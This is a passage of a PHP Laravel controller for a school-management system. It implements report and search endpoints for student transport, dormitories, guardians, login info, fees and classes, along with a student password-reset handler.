                    ->join('aramisc_vehicles', 'aramisc_assign_vehicles.vehicle_id', '=', 'aramisc_vehicles.id')
                    ->join('aramisc_staffs', 'aramisc_vehicles.driver_id', '=', 'aramisc_staffs.id')
                    ->get();

                return ApiBaseMethod::sendResponse($transport, null);
            }

        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentTransportReportApi(Request $request, $school_id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $transport = DB::table('aramisc_assign_vehicles')
                    ->select('aramisc_routes.title as route', 'aramisc_vehicles.vehicle_no', 'aramisc_vehicles.vehicle_model', 'aramisc_vehicles.made_year', 'aramisc_staffs.full_name as driver_name', 'aramisc_staffs.mobile', 'aramisc_staffs.driving_license')
                    ->join('aramisc_routes', 'aramisc_assign_vehicles.route_id', '=', 'aramisc_routes.id')
                    ->join('aramisc_vehicles', 'aramisc_assign_vehicles.vehicle_id', '=', 'aramisc_vehicles.id')
                    ->join('aramisc_staffs', 'aramisc_vehicles.driver_id', '=', 'aramisc_staffs.id')
                    ->where('aramisc_assign_vehicles.school_id',$school_id)
                    ->get();

                return ApiBaseMethod::sendResponse($transport, null);
            }

        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentTransportReportSearch(Request $request)
    {


        try {
            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->route != "") {
                $students->where('route_list_id', $request->route);
            } else {
                $students->where('route_list_id', '!=', '');
            }
            if ($request->vehicle != "") {
                $students->where('vechile_id', $request->vehicle);
            } else {
                $students->where('vechile_id', '!=', '');
            }
            $students = $students->get();

            $classes = AramiscClass::where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->get();
            $routes = AramiscRoute::where('active_status', 1)->get();
            $vehicles = AramiscVehicle::where('active_status', 1)->get();


            $class_id = $request->class;
            $route_id = $request->route;
            $vechile_id = $request->vehicle;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['routes'] = $routes->toArray();
                $data['vehicles'] = $vehicles->toArray();
                $data['students'] = $students->toArray();
                $data['class_id'] = $class_id;
                $data['route_id'] = $route_id;
                $data['vechile_id'] = $vechile_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.transport.student_transport_report', compact('classes', 'routes', 'vehicles', 'students', 'class_id', 'route_id', 'vechile_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentTransportReportSearch(Request $request , $school_id)
    {


        try {
            $students = AramiscStudent::query();
            $students->where('active_status', 1)->where('school_id',$school_id);
            if ($request->class != "") {
                $students->where('class_id', $request->class)->where('school_id',$school_id);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section)->where('school_id',$school_id);
            }
            if ($request->route != "") {
                $students->where('route_list_id', $request->route)->where('school_id',$school_id);
            } else {
                $students->where('route_list_id', '!=', '')->where('school_id',$school_id);
            }
            if ($request->vehicle != "") {
                $students->where('vechile_id', $request->vehicle)->where('school_id',$school_id);
            } else {
                $students->where('vechile_id', '!=', '')->where('school_id',$school_id);
            }
            $students = $students->get();

            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            $routes = AramiscRoute::where('active_status', 1)->where('school_id',$school_id)->get();
            $vehicles = AramiscVehicle::where('active_status', 1)->where('school_id',$school_id)->get();


            $class_id = $request->class;
            $route_id = $request->route;
            $vechile_id = $request->vehicle;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['routes'] = $routes->toArray();
                $data['vehicles'] = $vehicles->toArray();
                $data['students'] = $students->toArray();
                $data['class_id'] = $class_id;
                $data['route_id'] = $route_id;
                $data['vechile_id'] = $vechile_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.transport.student_transport_report', compact('classes', 'routes', 'vehicles', 'students', 'class_id', 'route_id', 'vechile_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentDormitoryReport(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();
            $dormitories = AramiscDormitoryList::where('active_status', 1)->get();
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('dormitory_id', '!=', "")->limit(100)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['dormitories'] = $dormitories->toArray();
                $data['students'] = $students->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.dormitory.student_dormitory_report', compact('classes', 'students', 'dormitories'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentDormitoryReport(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('school_id',$school_id)->get();
            $dormitories = AramiscDormitoryList::where('active_status', 1)->where('school_id',$school_id)->get();
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('dormitory_id', '!=', "")->limit(100)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['dormitories'] = $dormitories->toArray();
                $data['students'] = $students->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.dormitory.student_dormitory_report', compact('classes', 'students', 'dormitories'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentDormitoryReportSearch(Request $request)
    {

        try {
            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->dormitory != "") {
                $students->where('dormitory_id', $request->dormitory);
            } else {
                $students->where('dormitory_id', '!=', '');
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();
            $dormitories = AramiscDormitoryList::where('active_status', 1)->get();

            $class_id = $request->class;
            $dormitory_id = $request->dormitory;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['dormitories'] = $dormitories->toArray();
                $data['students'] = $students->toArray();
                $data['class_id'] = $class_id;
                $data['dormitory_id'] = $dormitory_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.dormitory.student_dormitory_report', compact('classes', 'dormitories', 'students', 'class_id', 'dormitory_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentDormitoryReportSearch(Request $request, $school_id)
    {

        try {
            $students = AramiscStudent::query();
            $students->where('active_status', 1)->where('school_id',$school_id);
            if ($request->class != "") {
                $students->where('class_id', $request->class)->where('school_id',$school_id);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section)->where('school_id',$school_id);
            }
            if ($request->dormitory != "") {
                $students->where('dormitory_id', $request->dormitory)->where('school_id',$school_id);
            } else {
                $students->where('dormitory_id', '!=', '')->where('school_id',$school_id);
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('school_id',$school_id)->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('school_id',$school_id)->get();
            $dormitories = AramiscDormitoryList::where('active_status', 1)->where('school_id',$school_id)->get();

            $class_id = $request->class;
            $dormitory_id = $request->dormitory;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['dormitories'] = $dormitories->toArray();
                $data['students'] = $students->toArray();
                $data['class_id'] = $class_id;
                $data['dormitory_id'] = $dormitory_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.dormitory.student_dormitory_report', compact('classes', 'dormitories', 'students', 'class_id', 'dormitory_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentReport(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $types = AramiscStudentCategory::all();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['types'] = $types->toArray();
                $data['genders'] = $genders->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_report', compact('classes', 'types', 'genders'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentReportSearch(Request $request)
    {


        try {
            $students = AramiscStudent::query();

            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);


            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }

            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }

            if ($request->type != "") {
                $students->where('student_category_id', $request->type);
            }

            if ($request->gender != "") {
                $students->where('gender_id', $request->gender);
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $types = AramiscStudentCategory::all();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $class_id = $request->class;
            $type_id = $request->type;
            $gender_id = $request->gender;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['types'] = $types->toArray();
                $data['genders'] = $genders->toArray();
                $data['class_id'] = $class_id;
                $data['type_id'] = $type_id;
                $data['gender_id'] = $gender_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_report', compact('students', 'classes', 'types', 'genders', 'class_id', 'type_id', 'gender_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function guardianReport(Request $request)
    {
        try {
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.guardian_report', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function guardianReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            $students->where('class_id', $request->class);
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();


            $class_id = $request->class;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.guardian_report', compact('students', 'classes', 'class_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function guardian_Report(Request $request)
    {
        try {
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.guardian_report', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentHistory(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $admission_years = AramiscStudent::distinct('admission_date')->select('admission_date')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $years = AramiscStudent::select('admission_date')->where('active_status', 1)
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get()
                ->distinct(function ($val) {
                    return Carbon::parse($val->admission_date)->format('Y');
                });

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                $data['years'] = $years->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_history', compact('students', 'classes', 'years'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentHistorySearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            $students->where('class_id', $request->class);
            $students->where('active_status', 1);
            if ($request->admission_year != "") {
                $students->where('admission_date', 'like',  $request->admission_year . '%');
            }

            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();


            $years = AramiscStudent::select('admission_date')->where('active_status', 1)
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get()
                ->distinct(function ($val) {
                    return Carbon::parse($val->admission_date)->format('Y');
                });


            $class_id = $request->class;
            $year = $request->admission_year;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['years'] = $years->toArray();
                $data['class_id'] = $class_id;
                $data['year'] = $year;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_history', compact('students', 'classes', 'years', 'class_id', 'year'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_History(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $students = AramiscStudent::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $admission_years = AramiscStudent::distinct('admission_date')->select('admission_date')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $years = AramiscStudent::select('admission_date')->where('active_status', 1)
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get()
                ->distinct(function ($val) {
                    return Carbon::parse($val->admission_date)->format('Y');
                });

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                $data['years'] = $years->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_history', compact('students', 'classes', 'years'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentLoginReport(Request $request)
    {
        try {
            $students = AramiscStudent::all();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.login_info', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentLoginSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            $students->where('class_id', $request->class);
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            $students = $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $class_id = $request->class;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.login_info', compact('students', 'classes', 'class_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_Login_Report(Request $request)
    {
        try {
            $students = AramiscStudent::all();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.login_info', compact('students', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function resetStudentPassword(Request $request)
    {

        try {
            if ($request->new_password == "") {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('New Password and id field are required');
                }
                return redirect('student-login-report')->with('message-dander', 'New Password field is required');
            } else {
                $password = Hash::make($request->new_password);
                $user = User::find($request->id);
                $user->password = $password;
                $result = $user->save();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($result) {
                        return ApiBaseMethod::sendResponse(null, 'Password reset has been successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                } else {
                    if ($result) {
                        return redirect('student-login-report')->with('message-success', 'Password reset has been successfully');
                    } else {
                        return redirect('student-login-report')->with('message-danger', 'Something went wrong, please try again');
                    }
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesStatemnt(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.fees_statment', compact('classes', 'fees_masters'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function feesStatementSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'student' => 'required',
            'class' => 'required',
            'section' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $fees_masters = AramiscFeesMaster::select('fees_group_id')->where('active_status', 1)->distinct('fees_group_id')->get();
            $student = AramiscStudent::find($request->student);
            $fees_assigneds = AramiscFeesAssign::where('student_id', $request->student)->get();
            $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $request->student)->get();
            $applied_discount = [];
            foreach ($fees_discounts as $fees_discount) {
                $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->first();
                if (isset($fees_payment->fees_discount_id)) {
                    $applied_discount[] = $fees_payment->fees_discount_id;
                }
            }

            $class_id = $request->class;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['fees_masters'] = $fees_masters->toArray();
                $data['fees_assigneds'] = $fees_assigneds->toArray();
                $data['fees_discounts'] = $fees_discounts->toArray();
                $data['applied_discount'] = $applied_discount;
                $data['student'] = $student;
                $data['class_id'] = $class_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.fees_statment', compact('classes', 'fees_masters', 'fees_assigneds', 'fees_discounts', 'applied_discount', 'student', 'class_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function balanceFeesReport(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.balance_fees_report', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function balanceFeesSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->get();
            $balance_students = [];

            $fees_masters = AramiscFeesMaster::where('active_status', 1)->get();

            foreach ($students as $student) {
                $total_balance = 0;
                $total_discount = 0;
                $total_amount = 0;
                foreach ($fees_masters as $fees_master) {
                    $fees_assign = AramiscFeesAssign::where('student_id', $student->id)->where('fees_master_id', $fees_master->id)->first();
                    if ($fees_assign != "") {
                        $discount_amount = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_master->fees_type_id)->sum('discount_amount');

                        $balance = AramiscFeesPayment::where('student_id', $student->id)->where('fees_type_id', $fees_master->fees_type_id)->sum('amount');




                        $total_balance += $balance;
                        $total_discount += $discount_amount;
                        $total_amount += $fees_master->amount;
                    }
                }
                $total_paid = $total_balance + $total_discount;
                if ($total_amount > $total_paid) {
                    $balance_students[] = $student;
                }
            }


            $class_id = $request->class;



            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['balance_students'] = $balance_students;
                $data['class_id'] = $class_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.feesCollection.balance_fees_report', compact('classes', 'balance_students', 'class_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function balance_Fees_Report(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.balance_fees_report', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function transactionReport(Request $request)
    {
        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, null);
            }
            return view('backEnd.feesCollection.transaction_report');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function transactionReportSearch(Request $request)
    {
        try {
            $date_from = date('Y-m-d', strtotime($request->date_from));
            $date_to = date('Y-m-d', strtotime($request->date_to));
            $fees_payments = AramiscFeesPayment::where('payment_date', '>=', $date_from)->where('payment_date', '<=', $date_to)->get();
            $fees_payments = $fees_payments->distinct('student_id');
            $add_incomes = AramiscAddIncome::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->get();
            $add_expenses = AramiscAddExpense::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['fees_payments'] = $fees_payments->toArray();
                $data['add_incomes'] = $add_incomes->toArray();
                $data['add_expenses'] = $add_expenses->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.feesCollection.transaction_report', compact('fees_payments', 'add_incomes', 'add_expenses'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function transaction_Report(Request $request)
    {
        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, null);
            }
            return view('backEnd.feesCollection.transaction_report');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classReport(Request $request)
    {
        try {
            $classes = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.reports.class_report', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $class = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('id', $request->class)->first();
            if ($request->section != "") {
                $section = AramiscSection::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('id', $request->section)->first();
            } else {
                $section = '';
            }

            $students = AramiscStudent::query();
            $students->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            $students->where('class_id', $request->class);
            $students = $students->get();

            $assign_subjects = AramiscAssignSubject::query();
            $assign_subjects->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            if ($request->section != "") {
                $assign_subjects->where('section_id', $request->section);
            }
            $assign_subjects->where('class_id', $request->class);
            $assign_subjects = $assign_subjects->get();

            $assign_subjects = AramiscAssignSubject::query();
